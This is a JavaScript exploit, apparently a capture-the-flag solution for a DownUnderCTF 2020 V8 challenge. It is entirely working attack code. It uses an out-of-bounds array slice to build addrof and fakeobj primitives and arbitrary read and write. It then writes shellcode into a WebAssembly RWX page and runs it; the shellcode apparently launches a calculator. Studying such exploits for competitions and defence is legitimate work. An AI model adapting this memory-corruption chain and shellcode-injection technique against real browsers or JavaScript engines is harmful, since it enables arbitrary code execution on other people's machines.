// Exploit for DownUnderCTF 2020 is-this-pwn-or-web

var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var a = [1.1];
var b = a.slice(0,1);
var fl_arr_map = itof(ftoi(b[1]) & 0xffffffffn);
var obj_arr_map = itof(ftoi(fl_arr_map) + 0x50n);

console.log("[+] Float map: 0x"+ftoi(fl_arr_map).toString(16));
console.log("[+] Object map: 0x"+ftoi(obj_arr_map).toString(16));

function addrof(arr) {
    let c = [1.1, 1.2, 1.3];
    let d = c.slice(0,1);
    d[1] = obj_arr_map;
    d[0] = arr;
    d[1] = fl_arr_map;
    let leak = ftoi(d[0]) & 0xffffffffn;
    return leak;
}

function fakeobj(addr) {
    let c = [itof(addr), 1.2, 1.3]
    let d = c.slice(0,1);
    d[1] = obj_arr_map;
    let fake = d[0];
    d[1] = fl_arr_map
    return fake
}

var crafted_arr = [fl_arr_map, 1.2, 1.3, 1.4];
function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeobj(addrof(crafted_arr) - 0x20n);
    crafted_arr[1] = itof((8n << 32n) + addr - 0x8n);
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
        let fake = fakeobj(addrof(crafted_arr) - 0x20n);
        crafted_arr[1] = itof((8n << 32n) + addr - 0x8n);
        fake[0] = itof(BigInt(val));
}

function exploit() {
    var wasm_code = new Uint8Array(
        [
            0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,
            1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,
            0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
            128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,
            111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,
            128,0,1,132,128,128,128,0,0,65,0,11
        ]
    );
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;
    var wasm_instance_addr = addrof(wasm_instance)-1n+0x68n;
    var rwx_page_addr = arb_read(wasm_instance_addr);
    console.log("[+] RWX page: 0x"+ (rwx_page_addr).toString(16));

    function copy_shellcode(addr, shellcode) {
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
        
        let backing_store_addr = buf_addr + 0x14n;
        arb_write(backing_store_addr, addr);
        console.log("[+] ArrayBuffer backingstore: 0x"+ backing_store_addr.toString(16));

        for (let i = 0; i < shellcode.length; i++) {
            dataview.setUint32(4*i, shellcode[i], true);
        }
    }
    
    var shellcode=[                 
        0x90909090,
        0x90909090,
        0x782fb848,
        0x636c6163,
        0x48500000,
        0x73752fb8,
        0x69622f72,
        0x8948506e,
        0xc03148e7,
        0x89485750,
        0xd23148e6,
        0x3ac0c748,
        0x50000030,
        0x4944b848,
        0x414c5053,
        0x48503d59,
        0x3148e289,
        0x485250c0,
        0xc748e289,
        0x00003bc0,
        0x050f00
    ];

    copy_shellcode(rwx_page_addr, shellcode);
    f();
}
exploit();
